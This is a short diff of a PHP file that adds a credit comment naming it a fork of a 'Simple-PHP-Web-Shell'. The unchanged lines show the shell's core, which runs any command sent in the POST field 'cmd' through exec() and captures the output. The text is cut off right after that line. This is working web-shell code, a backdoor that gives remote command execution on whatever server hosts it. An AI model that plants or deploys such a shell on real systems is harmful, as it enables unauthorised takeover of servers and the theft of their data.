@@ -1,4 +1,10 @@
 <?php
+/* 
+ Forked from artyumm's Simple-PHP-Web-Shell
+ https://github.com/artyuum/Simple-PHP-Web-Shell
+ Modified by Secnigma
+ TODO: Make the output pretty! 
+ */
 if (!empty($_POST['cmd'])) {
     $out=null;
     $cmd = exec($_POST['cmd'] . " 2>&1",$out);
